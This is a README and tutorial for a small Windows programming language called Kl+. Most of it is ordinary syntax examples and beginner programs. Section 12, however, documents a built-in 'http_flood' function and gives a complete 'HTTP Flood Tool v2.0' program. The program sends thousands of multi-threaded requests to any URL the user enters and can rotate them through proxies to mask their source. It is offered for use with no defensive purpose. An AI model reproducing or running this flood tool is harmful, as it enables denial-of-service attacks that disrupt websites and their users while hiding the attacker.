# Kl+ Programming Language

**Kl+** is a modern compiled programming language that combines low-level control of C/C++ with the expressiveness of high-level languages.

- **Version:** 0.1.3
- **Platforms:** Windows

---

## Installation

Check installation:
```bash
kl version
```
> If `kl` is not found, add `C:\kl+\bin` to your `PATH` environment variable.

---

## Quick Start

Create a file `hello.kl`:
```
fn main() {
    println("Hello, World!");
}
```
Run the program:
```bash
kl run hello.kl
```

---

## 1. Variables

### Immutable (default)
```
let x: i32 = 10;
```

### Mutable
```
let mut y: i32 = 20;
y = 30;
y += 10;
```

### Short declaration (type inference)
```
z := 42;
name := "Alice";
```

### C-style declaration
```
int a = 100;
float b = 3.14;
string s = "Hello";
```

### Constants
```
const PI: f64 = 3.14159265359;
const MAX_SIZE: i32 = 1000;
```

### `var` — short mutable
```
var count = 0;
count += 1;
```

---

## 2. Data Types

### Integers
| Type      | Size    | Range                      |
|----------|---------|----------------------------|
| `i8`     | 1 byte  | -128 to 127                |
| `i16`    | 2 bytes | -32768 to 32767            |
| `i32`/`int` | 4 bytes | ±2 billion                 |
| `i64`    | 8 bytes | ±9 quintillion             |
| `u8`     | 1 byte  | 0 to 255                   |
| `u16`    | 2 bytes | 0 to 65535                 |
| `u32`    | 4 bytes | 0 to 4 billion             |
| `u64`    | 8 bytes | 0 to 18 quintillion        |

### Floating point numbers
| Type        | Size    | Precision     |
|------------|---------|---------------|
| `f32`      | 4 bytes | ~7 digits     |
| `f64`/`float` | 8 bytes | ~15 digits    |

### Other types
| Type        | Description               |
|------------|---------------------------|
| `bool`     | `true` or `false`         |
| `char`     | Single character `'A'`    |
| `str`/`string` | String `"Hello"`         |

### Number literals
```
let decimal: i32 = 42;
let hex: i32 = 0xFF;
let binary: i32 = 0b1010;
let octal: i32 = 0o77;
let with_sep: i64 = 1_000_000;
let scientific: f64 = 3.14e-2;
```

---

## 3. Functions

### Basic function
```
fn add(a: i32, b: i32) -> i32 {
    return a + b;
}

fn main() {
    let result: i32 = add(5, 3);
    println("5 + 3 = %d", result);
}
```

### No return value
```
fn greet(name: str) {
    println("Hello, %s!", name);
}
```

### Short form
```
fn square(x: i32) -> i32 => x * x;
fn double(x: i32) -> i32 => x * 2;
```

### Default values
```
fn power(base: f64, exp: i32 = 2) -> f64 {
    let mut result: f64 = 1.0;
    for i in 0..exp {
        result = result * base;
    }
    return result;
}

fn main() {
    println("%f", power(3.0));      // 9.0
    println("%f", power(2.0, 10));  // 1024.0
}
```

### Public function
```
pub fn api_function() {
    // Accessible from other modules
}
```

---

## 4. Operators

### Arithmetic
| Operator | Description | Example        |
|----------|------------|---------------|
| `+`      | Addition   | `5 + 3 → 8`   |
| `-`      | Subtraction| `5 - 3 → 2`   |
| `*`      | Multiplication | `5 * 3 → 15` |
| `/`      | Division   | `7 / 2 → 3`   |
| `%`      | Remainder  | `7 % 3 → 1`   |
| `**`     | Power      | `2 ** 10 → 1024` |

```
fn main() {
    println("10 + 3 = %d", 10 + 3);
    println("10 - 3 = %d", 10 - 3);
    println("10 * 3 = %d", 10 * 3);
    println("10 / 3 = %d", 10 / 3);
}
```

### Comparisons
| Operator | Description    |
|----------|---------------|
| `==`     | Equal         |
| `!=`     | Not equal     |
| `<`      | Less than     |
| `>`      | Greater than  |
| `<=`     | Less or equal |
| `>=`     | Greater or equal |

```
fn main() {
    let a: i32 = 10;
    let b: i32 = 20;
    if a < b {
        println("a is less than b");
    }
}
```

### Logical
| Operator | Description |
|----------|------------|
| `&&`     | AND        |
| `\|\|`   | OR         |
| `!`      | NOT        |

```
fn main() {
    let age: i32 = 25;
    let has_license: bool = true;
    if age >= 18 && has_license {
        println("OK");
    }
}
```

### Bitwise
| Operator | Description  |
|----------|-------------|
| `&`      | AND         |
| `\|`     | OR          |
| `^`      | XOR         |
| `~`      | NOT         |
| `<<`     | Left shift  |
| `>>`     | Right shift |

```
fn main() {
    let a: i32 = 0b1010;
    let b: i32 = 0b1100;
    println("a & b = %d", a & b);   // 8 (0b1000)
    println("a << 2 = %d", a << 2); // 40 (0b101000)
}
```

### Assignment
```
fn main() {
    let mut x: i32 = 10;
    x = 20;
    x += 5;   // 25
    x -= 3;   // 22
    x *= 2;   // 44
    x /= 4;   // 11
    x %= 3;   // 2
    println("x = %d", x);
}
```

### Increment and Decrement
```
fn main() {
    let mut i: i32 = 0;
    i++;      // postfix
    ++i;      // prefix
    i--;
    --i;
    println("i = %d", i);
}
```

### Ternary operator
```
fn main() {
    let age: i32 = 20;
    let status: str = age >= 18 ? "adult" : "minor";
    println("Status: %s", status);
}
```

---

## 5. Control Flow

### If / Elif / Else
```
fn main() {
    let score: i32 = 85;
    if score >= 90 {
        println("Excellent!");
    } elif score >= 70 {
        println("Good");
    } elif score >= 50 {
        println("OK");
    } else {
        println("Fail");
    }
}
```

### For (range)
```
fn main() {
    // 0..10 (excluding 10)
    for i in 0..10 {
        println("%d", i);
    }
    
    // 1..=10 (inclusive)
    for i in 1..=10 {
        println("%d", i);
    }
}
```

### For with step
```
fn main() {
    for i in 0..10 step 2 {
        println("%d", i);  // 0, 2, 4, 6, 8
    }
}
```

### For with filter
```
fn main() {
    for i in 0..20 where i % 2 == 0 {
        println("%d", i);  // even numbers
    }
}
```

### For (C-style)
```
fn main() {
    for (int i = 0; i < 10; i++) {
        println("%d", i);
    }
}
```

### For-else
```
fn main() {
    for i in 0..10 {
        if i == 5 {
            println("Found 5!");
            break;
        }
    } else {
        println("Not found");  // executes if break didn't occur
    }
}
```

### While
```
fn main() {
    let mut count: i32 = 0;
    while count < 5 {
        println("Count: %d", count);
        count += 1;
    }
}
```

### Do-While
```
fn main() {
    let mut i: i32 = 0;
    do {
        println("i = %d", i);
        i += 1;
    } while i < 3;
}
```

### Loop (infinite)
```
fn main() {
    let mut counter: i32 = 0;
    loop {
        println("Counter: %d", counter);
        counter += 1;
        if counter >= 5 {
            break;
        }
    }
}
```

### Break and Continue
```
fn main() {
    for i in 0..10 {
        if i == 3 { continue; }
        if i == 7 { break; }
        println("%d", i);  // 0,1,2,4,5,6
    }
}
```

### Match
```
fn main() {
    let day: i32 = 3;
    match day {
        1 => println("Monday"),
        2 => println("Tuesday"),
        3 => println("Wednesday"),
        4 => println("Thursday"),
        5 => println("Friday"),
        _ => println("Weekend")
    }
}
```

---

## 6. Structures

### Declaration and usage
```
struct Point {
    x: i32,
    y: i32
}

fn main() {
    let mut p: Point;
    p.x = 10;
    p.y = 20;
    println("Point: (%d, %d)", p.x, p.y);
}
```

### Methods (impl)
```
struct Rectangle {
    width: i32,
    height: i32
}

impl Rectangle {
    pub fn area(self) -> i32 {
        return self.width * self.height;
    }
    
    pub fn scale(&mut self, factor: i32) {
        self.width *= factor;
        self.height *= factor;
    }
}

fn main() {
    let mut rect: Rectangle;
    rect.width = 10;
    rect.height = 5;
    println("Area: %d", rect.area());
    
    rect.scale(2);
    println("New area: %d", rect.area());
}
```

---

## 7. Enum

```
enum Color {
    Red,
    Green,
    Blue
}

enum Status {
    Ok = 200,
    NotFound = 404,
    Error = 500
}

fn main() {
    let status: Status = Status::Ok;
    match status {
        Status::Ok => println("Success"),
        Status::NotFound => println("Not found"),
        Status::Error => println("Error")
    }
}
```

---

## 8. Memory Management

### Allocation and freeing
```
fn main() {
    let arr: ptr<i32> = alloc(i32, 10);
    arr[0] = 100;
    arr[1] = 200;
    println("arr[0] = %d", arr[0]);
    println("arr[1] = %d", arr[1]);
    free arr;
}
```

### Pointers
```
fn main() {
    let mut x: i32 = 42;
    let ptr: ptr<i32> = &x;
    let value: i32 = *ptr;
    println("x = %d, *ptr = %d", x, value);
    
    *ptr = 100;
    println("x = %d", x);  // 100
}
```

### sizeof and cast
```
fn main() {
    println("sizeof(i32) = %d", sizeof(i32));
    
    let i: i32 = 65;
    let c: char = cast<char>(i);
    println("char: %c", c);  // 'A'
    
    let f: f64 = 3.14;
    let n: i32 = cast<i32>(f);
    println("int: %d", n);  // 3
}
```

### Unsafe block
```
fn main() {
    unsafe {
        let raw: ptr<u8> = alloc(u8, 256);
        raw[0] = 72;
        raw[1] = 0;
        free raw;
    }
}
```

---

## 9. Built-in Functions

### Input/Output
| Function          | Description            |
|------------------|------------------------|
| `print("text")`  | Print without newline  |
| `println("text")`| Print with newline     |
| `input()`        | Read string input      |
| `input_int()`    | Read integer input     |
| `input_float()`  | Read float input       |

```
fn main() {
    print("Enter name: ");
    let name: str = input();
    print("Enter age: ");
    let age: i32 = input_int();
    println("Hello, %s! Age: %d", name, age);
}
```

### Mathematics
| Function               | Description                 |
|-----------------------|-----------------------------|
| `sqrt(x)`             | Square root                 |
| `pow(base, exp)`      | Power                       |
| `abs(x)`              | Absolute (integers)         |
| `fabs(x)`             | Absolute (float)            |
| `floor(x)`, `ceil(x)` | Round down/up               |
| `round(x)`            | Mathematical rounding       |
| `sin(x)`, `cos(x)`, `tan(x)` | Trigonometry          |
| `log(x)`, `log10(x)`  | Logarithms                  |
| `exp(x)`              | Exponential                 |
| `min(a,b)`, `max(a,b)`| Min/max (integers)          |
| `fmin(a,b)`, `fmax(a,b)` | Min/max (float)          |
| `clamp(x, lo, hi)`    | Clamp value to range        |

```
fn main() {
    println("sqrt(16) = %f", sqrt(16.0));
    println("pow(2, 10) = %f", pow(2.0, 10.0));
    println("abs(-42) = %d", abs(-42));
    println("clamp(15, 0, 10) = %d", clamp(15, 0, 10));  // 10
}
```

### Random numbers
| Function               | Description                 |
|-----------------------|-----------------------------|
| `rand()`              | Random number (0..RAND_MAX) |
| `rand_range(min, max)`| Number in range             |
| `srand(seed)`         | Set random seed             |

```
fn main() {
    srand(42);
    println("rand() = %d", rand());
    println("rand_range(1, 100) = %d", rand_range(1, 100));
}
```

### Strings
| Function        | Description                     |
|----------------|---------------------------------|
| `strlen(s)`    | String length                   |
| `strcmp(a, b)` | Compare (0 = equal)             |

```
fn main() {
    let s: str = "Hello";
    println("Length: %d", strlen(s));
    
    if strcmp("abc", "abc") == 0 {
        println("Equal!");
    }
}
```

### Utilities
| Function             | Description                 |
|---------------------|-----------------------------|
| `exit(code)`        | Exit program                |
| `assert(cond, msg)` | Check condition             |
| `sizeof(type)`      | Size of type in bytes       |

---

## 10. Output Formatting

| Specifier | Type       | Example                  |
|-----------|-----------|-------------------------|
| `%d`      | `i32`     | `println("%d", 42)`     |
| `%lld`    | `i64`     | `println("%lld", 123456789)` |
| `%f`      | `f64`     | `println("%f", 3.14)`   |
| `%s`      | `str`     | `println("%s", "hello")`|
| `%c`      | `char`    | `println("%c", 65)`     |
| `%%`      | % symbol  | `println("100%%")`      |

---

## 11. CLI Commands

```bash
kl build main.kl --console output.exe    # Compile console application
kl build main.kl --app output.exe        # Compile GUI application
kl run main.kl                           # Build and run
kl check main.kl                         # Syntax check
kl tokens main.kl                        # Show tokens
kl version                               # Compiler version
kl help                                  # Help
```

---

## 12. HTTP/HTTPS Functions

### GET Requests

| Function | Description | Returns |
|---------|-------------|---------|
| `http_get(url)` | HTTP GET request | `str` — response body |
| `https_get(url)` | HTTPS GET request | `str` — response body |
| `http_get_status(url)` | HTTP status code | `i32` — code (200, 404...) |
| `https_get_status(url)` | HTTPS status code | `i32` — code (200, 404...) |

---

### POST Requests

| Function | Description | Returns |
|---------|-------------|---------|
| `http_post(url, data)` | HTTP POST request | `str` — response body |
| `https_post(url, data)` | HTTPS POST request | `str` — response body |

---

### Proxy

| Function | Description | Returns |
|---------|-------------|---------|
| `https_get_proxy(url, proxy)` | HTTPS GET via proxy | `str` — response body |
| `https_post_proxy(url, data, proxy)` | HTTPS POST via proxy | `str` — response body |
| `https_get_status_proxy(url, proxy)` | HTTPS status via proxy | `i32` — code |

**Proxy format:**
- `"http://ip:port"`
- `"ip:port"`

---

### File Download

| Function | Description | Returns |
|---------|-------------|---------|
| `http_download(url, filename)` | Download file | `i32` — 0 = OK, -1 = error |

---

### Multi-threaded Requests

| Function | Description | Returns |
|---------|-------------|---------|
| `http_flood(url, count, threads)` | Parallel GET requests | `i32` — number of successful |

---

### Memory Management

| Function | Description |
|---------|-------------|
| `http_free(response)` | Free response memory |

---

### HTTP Flood Example

```
fn main() {
    println("================================");
    println("   Kl+ HTTP Flood Tool v2.0");
    println("================================");
    println("");
    
    // URL input
    print("Enter target URL: ");
    let url: str = input();
    
    // Request count input
    print("How many requests? ");
    let count: i32 = input_int();
    
    // Thread count input
    print("Threads (1-64): ");
    let threads: i32 = input_int();
    
    // Mode selection
    println("");
    println("Mode:");
    println("  1 - No proxy (direct)");
    println("  2 - With proxies");
    print("Choose (1-2): ");
    let mode: i32 = input_int();
    
    println("");
    
    if mode == 1 {
        // No proxy - multi-threaded flood
        println("Starting %d requests with %d threads...", count, threads);
        println("");
        
        let success: i32 = http_flood(url, count, threads);
        
        println("");
        println("================================");
        println("  Results:");
        println("  Total:   %d", count);
        println("  Success: %d", success);
        println("  Failed:  %d", count - success);
        println("================================");
    } elif mode == 2 {
        // With proxies - manual input
        println("Enter proxies (format: ip:port)");
        println("Enter empty line to stop");
        println("");
        
        // Store up to 20 proxies
        let mut p1: str = "";
        let mut p2: str = "";
        let mut p3: str = "";
        let mut p4: str = "";
        let mut p5: str = "";
        let mut proxy_count: i32 = 0;
        
        print("Proxy 1: ");
        p1 = input();
        if strlen(p1) > 3 { proxy_count = 1; }
        
        if proxy_count >= 1 {
            print("Proxy 2 (or empty): ");
            p2 = input();
            if strlen(p2) > 3 { proxy_count = 2; }
        }
        
        if proxy_count >= 2 {
            print("Proxy 3 (or empty): ");
            p3 = input();
            if strlen(p3) > 3 { proxy_count = 3; }
        }
        
        if proxy_count >= 3 {
            print("Proxy 4 (or empty): ");
            p4 = input();
            if strlen(p4) > 3 { proxy_count = 4; }
        }
        
        if proxy_count >= 4 {
            print("Proxy 5 (or empty): ");
            p5 = input();
            if strlen(p5) > 3 { proxy_count = 5; }
        }
        
        println("");
        println("Using %d proxies", proxy_count);
        println("Starting %d requests with %d threads...", count, threads);
        println("");
        
        // Send requests with proxy rotation
        let mut success: i32 = 0;
        let mut fail: i32 = 0;
        
        for i in 1..=count {
            let mut current_proxy: str = p1;
            let proxy_idx: i32 = (i - 1) % proxy_count;
            
            if proxy_idx == 0 { current_proxy = p1; }
            elif proxy_idx == 1 { current_proxy = p2; }
            elif proxy_idx == 2 { current_proxy = p3; }
            elif proxy_idx == 3 { current_proxy = p4; }
            elif proxy_idx == 4 { current_proxy = p5; }
            
            let status: i32 = https_get_status_proxy(url, current_proxy);
            
            if status >= 200 && status < 400 {
                success += 1;
                println("  [%d/%d] Proxy: %s -> %d OK", i, count, current_proxy, status);
            } else {
                fail += 1;
                println("  [%d/%d] Proxy: %s -> %d FAIL", i, count, current_proxy, status);
            }
        }
        
        println("");
        println("================================");
        println("  Results:");
        println("  Total:   %d", count);
        println("  Success: %d", success);
        println("  Failed:  %d", fail);
        println("  Proxies: %d", proxy_count);
        println("================================");
    } else {
        println("Invalid mode!");
    }
}
```

---

## 13. Program Examples

### Fibonacci Numbers
```
fn fib(n: i32) -> i64 {
    if n <= 1 { return n; }
    
    let mut a: i64 = 0;
    let mut b: i64 = 1;
    
    for i in 2..=n {
        let temp: i64 = a + b;
        a = b;
        b = temp;
    }
    return b;
}

fn main() {
    for i in 0..20 {
        println("fib(%d) = %lld", i, fib(i));
    }
}
```

### Prime Numbers
```
fn is_prime(n: i32) -> bool {
    if n <= 1 { return false; }
    if n <= 3 { return true; }
    if n % 2 == 0 { return false; }
    
    let mut i: i32 = 3;
    while i * i <= n {
        if n % i == 0 { return false; }
        i += 2;
    }
    return true;
}

fn main() {
    for n in 2..=100 {
        if is_prime(n) {
            print("%d ", n);
        }
    }
    println("");
}
```

### Guess the Number
```
fn main() {
    srand(42);
    let secret: i32 = rand_range(1, 100);
    let mut attempts: i32 = 0;

    println("=== Guess the Number ===");
    println("Number between 1 and 100");

    loop {
        print("Your guess: ");
        let guess: i32 = input_int();
        attempts += 1;

        if guess < secret {
            println("Too low!");
        } elif guess > secret {
            println("Too high!");
        } else {
            println("Correct! %d attempts!", attempts);
            break;
        }
    }
}
```

### Calculator
```
fn main() {
    println("=== Calculator ===");

    print("First number: ");
    let a: f64 = input_float();

    print("Operator (+, -, *, /): ");
    let op: str = input();

    print("Second number: ");
    let b: f64 = input_float();

    if strcmp(op, "+") == 0 {
        println("Result: %f", a + b);
    } elif strcmp(op, "-") == 0 {
        println("Result: %f", a - b);
    } elif strcmp(op, "*") == 0 {
        println("Result: %f", a * b);
    } elif strcmp(op, "/") == 0 {
        if b != 0.0 {
            println("Result: %f", a / b);
        } else {
            println("Division by zero!");
        }
    } else {
        println("Unknown operator!");
    }
}
```

### Console Game Template
```
struct Player {
    x: i32,
    y: i32,
    health: i32,
    score: i32
}

fn main() {
    srand(12345);

    let mut player: Player;
    player.x = 5;
    player.y = 5;
    player.health = 100;
    player.score = 0;

    let mut running: bool = true;

    println("=== My Game ===");
    println("Commands: w/a/s/d = move, q = quit");

    while running && player.health > 0 {
        println("");
        println("Position: (%d, %d)", player.x, player.y);
        println("Health: %d  Score: %d", player.health, player.score);

        print("> ");
        let cmd: str = input();

        if strcmp(cmd, "w") == 0 {
            player.y -= 1;
        } elif strcmp(cmd, "s") == 0 {
            player.y += 1;
        } elif strcmp(cmd, "a") == 0 {
            player.x -= 1;
        } elif strcmp(cmd, "d") == 0 {
            player.x += 1;
        } elif strcmp(cmd, "q") == 0 {
            running = false;
        } else {
            println("Unknown command!");
        }

        player.score += 10;
    }

    println("");
    println("Game Over! Score: %d", player.score);
}
```

---

**Download the latest version of the language in Releases (.exe)**
